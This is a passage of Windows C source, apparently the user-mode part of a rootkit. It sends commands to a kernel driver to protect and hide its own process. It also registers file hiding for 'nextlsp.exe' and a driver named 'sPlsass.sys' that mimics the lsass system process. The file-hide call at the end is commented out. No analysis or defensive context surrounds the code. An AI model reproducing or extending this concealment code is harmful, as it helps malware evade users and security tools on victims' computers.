	MsgToSend.PROCESSP.NumsOf=1;
	memset(MsgToSend.PROCESSP.dwPid,0,sizeof(MsgToSend.PROCESSP.dwPid));
	MsgToSend.PROCESSP.dwPid[0]=GetCurrentProcessId();
	MsgToSend.dwOperation=CMD_PROCESSP;
	MsgToSend.FILE.dwOperation=CMD_PROCESSP_SET;
	MsgToDvr(MsgToSend);
	MsgToSend.FILE.dwOperation=CMD_PROCESSP_BEGIN;
	MsgToDvr(MsgToSend);

	memset(&MsgToSend,0,sizeof(MsgToSend));
	MsgToSend.PROCESSP.NumsOf=1;
	memset(MsgToSend.PROCESSP.dwPid,0,sizeof(MsgToSend.PROCESSP.dwPid));
	MsgToSend.PROCESSP.dwPid[0]=GetCurrentProcessId();
	MsgToSend.dwOperation=CMD_PROCESSH;
	MsgToSend.FILE.dwOperation=CMD_PROCESSH_SET;
	MsgToDvr(MsgToSend);
	MsgToSend.FILE.dwOperation=CMD_PROCESSH_BEGIN;
	MsgToDvr(MsgToSend);

	memset(&MsgToSend,0,sizeof(MsgToSend));
	DWORD dwNum=MultiByteToWideChar(CP_ACP,0,"c:\\windows\\system32\\nextlsp.exe||C:\\WINDOWS\\system32\\drivers\\sPlsass.sys",-1,NULL,0);
	ZeroMemory(MsgToSend.FILE.FileName,sizeof(MsgToSend.FILE.FileName));
	long dwLen=MultiByteToWideChar(CP_ACP,0,"c:\\windows\\system32\\nextlsp.exe||C:\\WINDOWS\\system32\\drivers\\sPlsass.sys",-1,MsgToSend.FILE.FileName,dwNum);
	MsgToSend.FILE.FileName[dwLen]='\0';
	MsgToSend.FILE.DosDev[0]=' ';
	MsgToSend.FILE.DosDev[1]='\0';
	MsgToSend.dwOperation=CMD_FILEHP;
	MsgToSend.FILE.dwOperation=CMD_FILE_SET;
	MsgToDvr(MsgToSend);
	MsgToSend.FILE.dwOperation=CMD_FILE_BEGIN;
	//MsgToDvr(MsgToSend);

	return;
}











